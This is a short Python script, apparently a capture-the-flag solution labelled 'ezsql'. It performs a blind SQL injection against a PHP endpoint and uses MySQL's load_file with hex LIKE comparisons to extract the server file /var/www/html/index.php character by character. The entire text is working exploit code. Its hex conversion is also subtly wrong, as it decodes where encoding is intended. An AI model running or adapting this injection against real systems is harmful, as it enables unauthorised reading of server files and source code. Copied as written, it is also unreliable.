'''ezsql-linkedbyx-2018-11
'''
import requests

table = '0123456789ABCDEF'
filename = '/var/www/html/index.php'
flag = ''
baseurl = 'http://172.16.206.101:8000/user/user.php?id=2-if(hex(load_file(0x%s))like(0x%s),1,2)'

for _ in range(10000):
  for c in table:
    pay = flag + c + '%'
    url = baseurl % (filename.decode('hex'), pay.decode('hex'))
    r = requests.get(url, cookies={'PHPSESSID': 'abcde'})
    if '2018' in r.text:
      flag += c
      print flag
      break






